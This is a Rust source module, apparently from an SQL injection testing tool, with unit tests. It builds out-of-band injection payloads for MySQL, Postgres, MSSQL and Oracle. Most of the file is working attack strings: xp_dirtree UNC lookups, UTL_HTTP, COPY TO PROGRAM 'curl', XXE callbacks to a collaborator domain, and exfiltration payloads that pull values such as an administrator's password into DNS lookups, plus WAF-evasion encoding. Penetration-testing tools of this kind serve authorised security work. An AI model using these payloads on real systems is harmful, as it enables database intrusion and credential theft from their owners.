#![deny(unsafe_code)]

//! Out-of-band (OOB) payload generators per DBMS.
//!
//! OOB exfiltrates via a side channel (DNS / HTTP) instead of the HTTP
//! response body. Every payload embeds a unique token subdomain
//! `<token>.<domain>` so a collaborator (Burp Collaborator, interactsh,
//! self-hosted DNS/HTTP listener) can correlate the callback.
//!
//! References (2024-2026):
//! - PortSwigger Web Security Academy, blind SQLi OOB labs (Oracle XXE
//!   `EXTRACTVALUE(xmltype(...))`, MSSQL `xp_dirtree`).
//! - PayloadsAllTheThings: Postgres `COPY TO PROGRAM nslookup/curl`,
//!   Oracle `UTL_INADDR / UTL_HTTP / DBMS_LDAP`, MSSQL UNC `xp_dirtree /
//!   xp_fileexist / xp_subdirs`, MySQL `LOAD_FILE` UNC (Windows only).
//! - NetSPI PowerUpSQL UNC path injection cheat sheet (MSSQL).

use core::fmt;

/// Side channel used by an OOB payload.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[non_exhaustive]
pub enum OobChannel {
    /// DNS resolution (`nslookup`, UNC `\\host\share`, `UTL_INADDR`, ...).
    Dns,
    /// Plain HTTP(S) request (`curl`, `UTL_HTTP`, `sp_OAMethod`, XXE, ...).
    Http,
}

impl fmt::Display for OobChannel {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Dns => write!(f, "dns"),
            Self::Http => write!(f, "http"),
        }
    }
}

/// A single OOB probe payload.
#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct OobPayload {
    /// Raw SQL injection string (already includes comment terminator).
    pub payload: String,
    /// DBMS this payload targets (`mysql`, `postgres`, `mssql`, `oracle`, `generic`).
    pub dbms: String,
    /// Side channel (`dns` or `http`).
    pub channel: OobChannel,
    /// Unique per-probe token embedded in the subdomain.
    pub token: String,
    /// Fully qualified domain the DB server is forced to resolve (`token.domain`).
    pub fqdn: String,
}

impl OobPayload {
    #[must_use]
    pub fn new(
        payload: impl Into<String>,
        dbms: impl Into<String>,
        channel: OobChannel,
        token: impl Into<String>,
        fqdn: impl Into<String>,
    ) -> Self {
        Self {
            payload: payload.into(),
            dbms: dbms.into(),
            channel,
            token: token.into(),
            fqdn: fqdn.into(),
        }
    }
}

/// Generate a fresh random token safe for DNS labels.
///
/// Format `oob` + 12 lowercase hex chars (15 chars total, always starts
/// with a letter, fits the 63-char DNS label limit).
#[must_use]
pub fn new_token() -> String {
    let simple = uuid::Uuid::new_v4().simple().to_string();
    let suffix: String = simple.chars().take(12).collect();
    format!("oob{suffix}")
}

/// Sanitize an arbitrary string into a valid DNS label.
///
/// Keeps `[a-z0-9-]`, lowercases, maps anything else to `-`, strips
/// leading/trailing `-`, truncates to 63 chars. Never returns empty
/// (falls back to `oob`).
#[must_use]
pub fn sanitize_dns_label(input: &str) -> String {
    let mut out: String = input
        .to_ascii_lowercase()
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' {
                c
            } else {
                '-'
            }
        })
        .collect();
    out = out.trim_matches('-').to_owned();
    if out.len() > 63 {
        out.truncate(63);
        out = out.trim_end_matches('-').to_owned();
    }
    if out.is_empty() {
        "oob".to_owned()
    } else {
        out
    }
}

/// Build the fully qualified exfil domain `<token>.<domain>`.
///
/// Both parts are sanitized/lowercased; a trailing dot on `domain` is
/// stripped. Returns e.g. `oobabc123.collab.example.com`.
#[must_use]
pub fn build_subdomain(token: &str, domain: &str) -> String {
    let label = sanitize_dns_label(token);
    let dom = domain.trim().trim_end_matches('.').to_ascii_lowercase();
    format!("{label}.{dom}")
}

/// Validate a user-supplied OOB domain (collaborator base domain).
///
/// Rejects empty strings, URLs with scheme/path/port, whitespace, and
/// labels violating RFC 1035 (length, charset, leading/trailing hyphen).
/// Requires at least one dot (e.g. `x.oastify.com`, not `localhost`).
#[must_use]
pub fn is_valid_oob_domain(domain: &str) -> bool {
    let d = domain.trim().trim_end_matches('.');
    if d.is_empty() || d.len() > 253 {
        return false;
    }
    if d.contains([' ', '\t', '\n', '\r', '/', ':', '@', '?', '#', '_']) {
        return false;
    }
    if d.contains("://") {
        return false;
    }
    if !d.contains('.') {
        return false;
    }
    for label in d.split('.') {
        if label.is_empty() || label.len() > 63 {
            return false;
        }
        if label.starts_with('-') || label.ends_with('-') {
            return false;
        }
        if !label.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
            return false;
        }
    }
    true
}

/// Hex-encode a string for DNS exfiltration (keeps `[0-9a-f]` only).
#[must_use]
pub fn encode_for_dns(input: &str) -> String {
    hex::encode(input.as_bytes())
}

/// Split a hex string into DNS-label-sized chunks (default 32 chars keeps
/// room for `token.domain` suffix under the 63-char label limit).
#[must_use]
pub fn chunk_for_dns(hex_data: &str, chunk: usize) -> Vec<String> {
    if hex_data.is_empty() || chunk == 0 {
        return Vec::new();
    }
    hex_data
        .as_bytes()
        .chunks(chunk)
        .map(|c| String::from_utf8_lossy(c).into_owned())
        .collect()
}

/// Generate OOB interaction payloads (no data exfil, just callback) for a
/// DBMS. Each payload embeds `fqdn = <token>.<domain>`.
///
/// `dbms` is one of `mysql | postgres | mssql | oracle`; `None`/unknown
/// yields a generic 3-probe set (MSSQL + Oracle + MySQL) covering the most
/// common stacks.
#[must_use]
pub fn oob_payloads_for(dbms: Option<&str>, domain: &str, token: &str) -> Vec<OobPayload> {
    let fqdn = build_subdomain(token, domain);
    match dbms {
        Some("mysql") => mysql_oob(&fqdn, token),
        Some("postgres") => postgres_oob(&fqdn, token),
        Some("mssql") => mssql_oob(&fqdn, token),
        Some("oracle") => oracle_oob(&fqdn, token),
        _ => {
            let mut out = Vec::with_capacity(3);
            // Most reliable probe per stack first.
            if let Some(p) = mssql_oob(&fqdn, token).first() {
                out.push(p.clone());
            }
            if let Some(p) = oracle_oob(&fqdn, token).first() {
                out.push(p.clone());
            }
            if let Some(p) = mysql_oob(&fqdn, token).first() {
                out.push(p.clone());
            }
            for p in &mut out {
                p.dbms = "generic".to_owned();
            }
            out
        }
    }
}

/// Generate OOB **data exfiltration** payloads embedding `select_expr`.
///
/// `select_expr` is a scalar subquery, e.g.
/// `(SELECT password FROM users WHERE username='administrator')`.
/// The value is concatenated into the looked-up hostname so it shows up in
/// collaborator DNS/HTTP logs. Prefer alphanumeric columns; for binary data
/// wrap the expression with `HEX(...)` / `ENCODE(..., 'hex')` / `RAWTOHEX`.
#[must_use]
pub fn oob_exfil_payloads_for(
    dbms: Option<&str>,
    domain: &str,
    token: &str,
    select_expr: &str,
) -> Vec<OobPayload> {
    let dom = domain.trim().trim_end_matches('.').to_ascii_lowercase();
    let label = sanitize_dns_label(token);
    let suffix = format!("{label}.{dom}");
    match dbms {
        Some("mssql") => vec![
            OobPayload::new(
                format!(
                    "'; DECLARE @p varchar(1024); SET @p=({select_expr}); EXEC('master..xp_dirtree ''\\\\''+@p+''.{suffix}\\\\a''') --"
                ),
                "mssql",
                OobChannel::Dns,
                token,
                format!("<data>.{suffix}"),
            ),
            OobPayload::new(
                format!("'; EXEC master..xp_dirtree '\\\\({select_expr}).{suffix}\\a' --"),
                "mssql",
                OobChannel::Dns,
                token,
                format!("<data>.{suffix}"),
            ),
        ],
        Some("oracle") => vec![
            OobPayload::new(
                format!(
                    "' AND UTL_INADDR.GET_HOST_ADDRESS(({select_expr})||'.{suffix}') IS NOT NULL --"
                ),
                "oracle",
                OobChannel::Dns,
                token,
                format!("<data>.{suffix}"),
            ),
            OobPayload::new(
                format!(
                    "' AND UTL_HTTP.REQUEST('http://'||({select_expr})||'.{suffix}/') IS NOT NULL --"
                ),
                "oracle",
                OobChannel::Http,
                token,
                format!("<data>.{suffix}"),
            ),
        ],
        Some("mysql") => vec![OobPayload::new(
            format!("' AND LOAD_FILE(CONCAT('\\\\\\\\',({select_expr}),'.{suffix}','\\\\a')) -- -"),
            "mysql",
            OobChannel::Dns,
            token,
            format!("<data>.{suffix}"),
        )],
        Some("postgres") => vec![OobPayload::new(
            format!(
                "'; DO $$DECLARE c text; p text; BEGIN SELECT ({select_expr}) INTO p; c:='copy (SELECT '''') to program ''nslookup '||p||'.{suffix}'''; EXECUTE c; END;$$ --"
            ),
            "postgres",
            OobChannel::Dns,
            token,
            format!("<data>.{suffix}"),
        )],
        _ => vec![
            OobPayload::new(
                format!("'; EXEC master..xp_dirtree '\\\\({select_expr}).{suffix}\\a' --"),
                "generic",
                OobChannel::Dns,
                token,
                format!("<data>.{suffix}"),
            ),
            OobPayload::new(
                format!(
                    "' AND UTL_INADDR.GET_HOST_ADDRESS(({select_expr})||'.{suffix}') IS NOT NULL --"
                ),
                "generic",
                OobChannel::Dns,
                token,
                format!("<data>.{suffix}"),
            ),
        ],
    }
}

fn mysql_oob(fqdn: &str, token: &str) -> Vec<OobPayload> {
    // Windows-only: LOAD_FILE on a UNC path forces an SMB/DNS lookup.
    // Linux targets typically ignore UNC -> no callback (documented).
    vec![
        OobPayload::new(
            format!("' AND LOAD_FILE(CONCAT('\\\\\\\\','{fqdn}','\\\\a')) -- -"),
            "mysql",
            OobChannel::Dns,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!("' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{fqdn}','\\\\a')) -- -"),
            "mysql",
            OobChannel::Dns,
            token,
            fqdn,
        ),
    ]
}

fn postgres_oob(fqdn: &str, token: &str) -> Vec<OobPayload> {
    vec![
        OobPayload::new(
            format!("'; COPY (SELECT '') TO PROGRAM 'nslookup {fqdn}' --"),
            "postgres",
            OobChannel::Dns,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!("'; COPY (SELECT '') TO PROGRAM 'curl http://{fqdn}/' --"),
            "postgres",
            OobChannel::Http,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!("'; SELECT dblink_connect('host={fqdn} user=a password=a dbname=a') --"),
            "postgres",
            OobChannel::Dns,
            token,
            fqdn,
        ),
    ]
}

fn mssql_oob(fqdn: &str, token: &str) -> Vec<OobPayload> {
    vec![
        OobPayload::new(
            format!("'; EXEC master..xp_dirtree '\\\\{fqdn}\\a' --"),
            "mssql",
            OobChannel::Dns,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!("'; EXEC master..xp_fileexist '\\\\{fqdn}\\a' --"),
            "mssql",
            OobChannel::Dns,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!(
                "'; DECLARE @o INT; EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @o OUT; EXEC sp_OAMethod @o, 'open', NULL, 'GET', 'http://{fqdn}/', 'false'; EXEC sp_OAMethod @o, 'send'; --"
            ),
            "mssql",
            OobChannel::Http,
            token,
            fqdn,
        ),
    ]
}

fn oracle_oob(fqdn: &str, token: &str) -> Vec<OobPayload> {
    vec![
        OobPayload::new(
            format!("' AND UTL_INADDR.GET_HOST_ADDRESS('{fqdn}') IS NOT NULL --"),
            "oracle",
            OobChannel::Dns,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!("' AND UTL_HTTP.REQUEST('http://{fqdn}/') IS NOT NULL --"),
            "oracle",
            OobChannel::Http,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!("' AND DBMS_LDAP.INIT(('{fqdn}',80)) IS NOT NULL --"),
            "oracle",
            OobChannel::Dns,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!(
                "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://{fqdn}/\"> %remote;]>'),'/l') FROM dual --"
            ),
            "oracle",
            OobChannel::Http,
            token,
            fqdn,
        ),
    ]
}

/// Encoding variants for OOB payloads (URL, double-URL, hex, unicode).
/// Reuses the boolean tamper-compatible encoder for WAF evasion.
#[must_use]
pub fn encode_oob_payload(payload: &str, encoding: &str) -> String {
    crate::techniques::boolean::payloads::encode_payload(payload, encoding)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn token_is_dns_safe() {
        let t = new_token();
        assert!(t.starts_with("oob"), "token: {t}");
        assert!(t.len() == 15, "token len: {t}");
        assert!(
            t.chars()
                .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit())
        );
        assert_eq!(sanitize_dns_label(&t), t);
    }

    #[test]
    fn token_uniqueness() {
        let a = new_token();
        let b = new_token();
        assert_ne!(a, b);
    }

    #[test]
    fn sanitize_maps_invalid() {
        assert_eq!(sanitize_dns_label("ABC_def.ghi!"), "abc-def-ghi");
        assert_eq!(sanitize_dns_label("---"), "oob");
        assert_eq!(sanitize_dns_label(""), "oob");
    }

    #[test]
    fn sanitize_truncates_63() {
        let long = "a".repeat(100);
        assert_eq!(sanitize_dns_label(&long).len(), 63);
    }

    #[test]
    fn subdomain_builds() {
        assert_eq!(
            build_subdomain("oobabc123", "Collab.Example.COM."),
            "oobabc123.collab.example.com"
        );
    }

    #[test]
    fn domain_validation() {
        assert!(is_valid_oob_domain("x.oastify.com"));
        assert!(is_valid_oob_domain("collab.example.com."));
        assert!(!is_valid_oob_domain(""));
        assert!(!is_valid_oob_domain("localhost"));
        assert!(!is_valid_oob_domain("http://evil.com"));
        assert!(!is_valid_oob_domain("a b.com"));
        assert!(!is_valid_oob_domain("-bad.example.com"));
        assert!(!is_valid_oob_domain("bad_.example.com"));
    }

    #[test]
    fn mysql_payload_embeds_fqdn() {
        let v = oob_payloads_for(Some("mysql"), "c.example.com", "oobtok123");
        assert!(!v.is_empty());
        for p in &v {
            assert!(
                p.payload.contains("oobtok123.c.example.com"),
                "got {}",
                p.payload
            );
            assert!(p.payload.contains("-- -"), "mysql comment: {}", p.payload);
            assert_eq!(p.channel, OobChannel::Dns);
        }
    }

    #[test]
    fn postgres_has_dns_and_http() {
        let v = oob_payloads_for(Some("postgres"), "c.example.com", "oobt1");
        assert!(v.iter().any(|p| p.channel == OobChannel::Dns));
        assert!(v.iter().any(|p| p.channel == OobChannel::Http));
        assert!(v.iter().any(|p| p.payload.contains("COPY")));
    }

    #[test]
    fn mssql_primary_is_xp_dirtree() {
        let v = oob_payloads_for(Some("mssql"), "c.example.com", "oobt2");
        assert!(v[0].payload.contains("xp_dirtree"));
        assert!(v[0].payload.contains("oobt2.c.example.com"));
    }

    #[test]
    fn oracle_covers_three_vectors() {
        let v = oob_payloads_for(Some("oracle"), "c.example.com", "oobt3");
        let joined = v
            .iter()
            .map(|p| p.payload.as_str())
            .collect::<Vec<_>>()
            .join("\n");
        assert!(joined.contains("UTL_INADDR"), "missing UTL_INADDR");
        assert!(joined.contains("UTL_HTTP"), "missing UTL_HTTP");
        assert!(joined.contains("DBMS_LDAP"), "missing DBMS_LDAP");
    }

    #[test]
    fn generic_falls_back_to_three() {
        let v = oob_payloads_for(None, "c.example.com", "oobt4");
        assert_eq!(v.len(), 3);
        for p in &v {
            assert_eq!(p.dbms, "generic");
        }
    }

    #[test]
    fn exfil_embeds_select_expr() {
        let expr = "(SELECT password FROM users WHERE username='administrator')";
        let v = oob_exfil_payloads_for(Some("mssql"), "c.example.com", "oobex1", expr);
        assert!(v[0].payload.contains(expr));
        assert!(v[0].payload.contains("oobex1.c.example.com"));
        let o = oob_exfil_payloads_for(Some("oracle"), "c.example.com", "oobex2", expr);
        assert!(o[0].payload.contains(expr));
    }

    #[test]
    fn dns_encode_and_chunk() {
        assert_eq!(encode_for_dns("AB"), "4142");
        let chunks = chunk_for_dns("41424344", 2);
        assert_eq!(chunks, vec!["41", "42", "43", "44"]);
        assert!(chunk_for_dns("", 32).is_empty());
        assert!(chunk_for_dns("aa", 0).is_empty());
    }
}
